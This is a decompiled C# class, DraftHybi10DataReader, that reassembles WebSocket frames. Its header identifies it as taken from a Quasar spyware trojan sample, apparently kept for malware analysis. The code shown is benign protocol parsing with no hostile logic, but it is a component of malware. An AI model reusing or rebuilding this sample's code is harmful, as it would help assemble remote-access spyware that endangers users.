// Decompiled with JetBrains decompiler
// Type: NoiseMe.Drags.App.Models.WebSocket4Net.Protocol.DraftHybi10DataReader
// Assembly: Stubv2.0, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E945C042-2241-44AF-B826-4AD3FC72B170
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\HEUR-Trojan-Spy.MSIL.Quasar.gen-a3f98ee0a78f039e0a9ea52dba13c713dc46f749512bd7d108cc9c05f57fc93d.exe

using NoiseMe.Drags.App.Models.WebSocket4Net.Common;
using NoiseMe.Drags.App.Models.WebSocket4Net.Protocol.FramePartReader;
using System.Collections.Generic;

namespace NoiseMe.Drags.App.Models.WebSocket4Net.Protocol
{
  internal class DraftHybi10DataReader : IClientCommandReader<WebSocketCommandInfo>
  {
    private List<WebSocketDataFrame> m_PreviousFrames;
    private WebSocketDataFrame m_Frame;
    private IDataFramePartReader m_PartReader;
    private int m_LastPartLength;

    public DraftHybi10DataReader()
    {
      this.m_Frame = new WebSocketDataFrame(new ArraySegmentList());
      this.m_PartReader = DataFramePartReader.NewReader;
    }

    public int LeftBufferSize => this.m_Frame.InnerData.Count;

    public IClientCommandReader<WebSocketCommandInfo> NextCommandReader => (IClientCommandReader<WebSocketCommandInfo>) this;

    protected void AddArraySegment(
      ArraySegmentList segments,
      byte[] buffer,
      int offset,
      int length,
      bool isReusableBuffer)
    {
      segments.AddSegment(buffer, offset, length, isReusableBuffer);
    }

    public WebSocketCommandInfo GetCommandInfo(
      byte[] readBuffer,
      int offset,
      int length,
      out int left)
    {
      this.AddArraySegment(this.m_Frame.InnerData, readBuffer, offset, length, true);
      IDataFramePartReader nextPartReader;
      int num = this.m_PartReader.Process(this.m_LastPartLength, this.m_Frame, out nextPartReader);
      if (num < 0)
      {
        left = 0;
        return (WebSocketCommandInfo) null;
      }
      left = num;
      if (left > 0)
        this.m_Frame.InnerData.TrimEnd(left);
      if (nextPartReader == null)
      {
        WebSocketCommandInfo commandInfo;
        if (this.m_Frame.IsControlFrame)
        {
          commandInfo = new WebSocketCommandInfo(this.m_Frame);
          this.m_Frame.Clear();
        }
        else if (this.m_Frame.FIN)
        {
          if (this.m_PreviousFrames != null && this.m_PreviousFrames.Count > 0)
          {
            this.m_PreviousFrames.Add(this.m_Frame);
            this.m_Frame = new WebSocketDataFrame(new ArraySegmentList());
            commandInfo = new WebSocketCommandInfo((IList<WebSocketDataFrame>) this.m_PreviousFrames);
            this.m_PreviousFrames = (List<WebSocketDataFrame>) null;
          }
          else
          {
            commandInfo = new WebSocketCommandInfo(this.m_Frame);
            this.m_Frame.Clear();
          }
        }
        else
        {
          if (this.m_PreviousFrames == null)
            this.m_PreviousFrames = new List<WebSocketDataFrame>();
          this.m_PreviousFrames.Add(this.m_Frame);
          this.m_Frame = new WebSocketDataFrame(new ArraySegmentList());
          commandInfo = (WebSocketCommandInfo) null;
        }
        this.m_LastPartLength = 0;
        this.m_PartReader = DataFramePartReader.NewReader;
        return commandInfo;
      }
      this.m_LastPartLength = this.m_Frame.InnerData.Count - num;
      this.m_PartReader = nextPartReader;
      return (WebSocketCommandInfo) null;
    }
  }
}
